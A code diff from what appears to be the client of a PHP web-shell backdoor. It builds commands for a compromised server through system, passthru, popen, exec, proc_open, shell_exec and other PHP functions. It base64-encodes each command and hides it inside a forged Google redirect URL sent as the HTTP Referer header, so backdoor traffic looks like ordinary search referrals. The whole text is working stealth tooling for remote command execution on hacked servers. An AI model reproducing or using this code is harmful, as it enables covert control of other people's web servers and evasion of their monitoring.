@@ -320,19 +320,19 @@ class host():
     for i in ran:
       try:
 	ret = self.execute("echo " + self.pwd, i)
+	#print ':', ret
 	if(ret==self.pwd):
+	  if first == -1:
+	    first=i
 	  sum_ok.append(methods[i])
-	  first=i
+	  
 	else:
 	  sum_no[methods[i]]=ret
-	  #print '- Escape ' + str(i) + ' unexpected response ' + ret
       except Exception, e:
 	sum_no[methods[i]]='Remote PHP error: ' + ret + " " + str(e)
-	#print '- Escape ' + str(i) + ' invalid response: ' + ret +')'
 
 
     # Summary 
-    
     if len(sum_ok)>0 and escape==-2:
       print "+ Accepted functions:",
       for m in sum_ok:
@@ -348,12 +348,12 @@ class host():
 
     if first==-1:
       print '! No working functions founded on ' + self.url + '. Exiting.'
-      return None
     else:
       self.method = first
       if escape != -2:
 	print '+ Using with method ' + str(first) + ' (' + methods[first] + ').' 
-      return first
+    
+    return first
 
   def execute_php(self,cmnd):
     
@@ -361,11 +361,8 @@ class host():
     cmdstr=base64.b64encode(cmnd)
     
     
-    # http://www.google.com/url?sa=t&source=web&ct=res&cd=7&url=http%3A%2F%2Fwww.example.com%2Fmypage.htm&ei=0SjdSa-1N5O8M_qW8dQN&rct=j&q=flowers&usg=AFQjCNHJXSUh7Vw7oubPaO3tZOzz-F-u_w&sig2=X8uCFh6IoPtnwmvGMULQfw
-    refurl='http://www.google.com/url?sa=' + self.pwd[:2] + '&source=' + cmdstr[:len(cmdstr)/2] + '&ei=' + cmdstr[(len(cmdstr)/2):]
-    
     try: 
-      ret=self.execHTTPGet(refurl)
+      ret=self.execHTTPGet(self.genRefUrl(cmdstr))
     
     except urllib2.URLError, e:
       raise
@@ -390,18 +387,23 @@ class host():
     elif(met==1):
       cmnd="passthru('" + cmnd + " 2>&1');"
     elif(met==2):
-      cmnd="$h=popen('" + cmnd + "', 'r'); echo stream_get_contents($h); pclose($h);"
+      # Using while() fread() because more common than stream_get_content()
+      cmnd="$h=popen('" + cmnd + "', 'r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);"
     elif(met==3):
-      cmnd="echo @exec('" + cmnd + " 2>&1');"
+      # Need \n added
+      cmnd="exec('" + cmnd + " 2>&1', $r); echo(join(\"\\n\",$r));"
     elif(met==4):
-      cmnd = "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('" + cmnd + "', $p, $pipes); $r = stream_get_contents ($pipes[1]); echo $r . stream_get_contents($pipes[2]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h);" 
+      cmnd = "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('" + cmnd + "', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096)); while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h);" 
     elif(met==5):
       cmnd="echo shell_exec('" + cmnd + " 2>&1');"
     elif(met==6):
+      # Not available in PHP compiled as apache module
       cmnd="$u = array('" + "','".join(cmnd.split(' ')[1:]) + "'); pcntl_exec('" + cmnd.split()[0] + "', $u);"
     elif(met==7):
+      # Needs perl extension
       cmnd="$perl = new perl(); $r = @perl->system('" + cmnd + " 2>&1'); echo $r"
     elif(met==8):
+      #Needs python extension
       cmnd="@python_eval('import os; os.system('" + cmnd + " 2>&1');"
 
     
@@ -419,47 +421,18 @@ class host():
     ubu='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.14) Gecko/2009090216 Ubuntu/9.04 (jaunty) Firefox/3.0.14'
     msie='Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; InfoPath.1)'
     
-  def genRefUrl(self,cmndstr):
+  def genRefUrl(self,cmdstr):
+    #As seen in offical google blog: http://analytics.blogspot.com/2009/04/upcoming-change-to-googlecom-search.html
+    # http://www.google.com/url?sa=t&source=web&ct=res&cd=7&url=http%3A%2F%2Fwww.example.com%2Fmypage.htm&ei=0SjdSa-1N5O8M_qW8dQN&rct=j&q=flowers&usg=AFQjCNHJXSUh7Vw7oubPaO3tZOzz-F-u_w&sig2=X8uCFh6IoPtnwmvGMULQfw
     
-    pwd=self.pwd
-    
-    mindistance='2083'
-    minr=''
-    
-    for r in refurls:
-      
-      url=urlparse.urlparse(r)
-      params=url[4]
-      keys = [part.split('=')[0] for part in params.split('&')] #params.keys()
-      values = [part.split('=')[1] for part in params.split('&')]
-
-      
-      distance =  []
-      newparams = ''
-    
-      if len(keys) != 3:
-	continue
-      
-      newparams = keys[0] + '=' + self.pwd + '&'
-      distance.append(abs(len(values[0]) - len(self.pwd))) # pwd_distance
-      
-      newparams += keys[1] + '=' + cmndstr + '&'
-      distance.append(abs(len(values[1]) - len(cmndstr)))
-      
+    parsed=urlparse.urlparse(self.url)
+    real_refurl = 'http://www.google.com/url?' + 'sa=' + self.pwd[:2] + '&source=web&ct=7' + '&url=' + urllib2.quote(parsed.geturl(),'') + '&q=' + urllib2.quote((parsed.netloc + parsed.path).replace('/',' '),'') + '&usg=' + cmdstr[:len(cmdstr)/2] + '&sig2=' + cmdstr[(len(cmdstr)/2):] 
     
     
-      newurl = url.geturl().replace(params,newparams)
-      
-      absdistance=0
-      for i in distance:
-	absdistance+=i
-      
-      if absdistance<mindistance:
-	mindistance=absdistance
-	minr=r
-   
-    #print '+ HTTP_REFERER fake header [' + str(refurls.index(minr)) + '] contains ' + str(absdistance) + ' characters more than real one.'
+    refurl='http://www.google.com/url?sa=' + self.pwd[:2] + '&source=' + cmdstr[:len(cmdstr)/2] + '&ei=' + cmdstr[(len(cmdstr)/2):]
+    return ''.join(real_refurl)
     
+      
     
 if __name__ == "__main__":
     
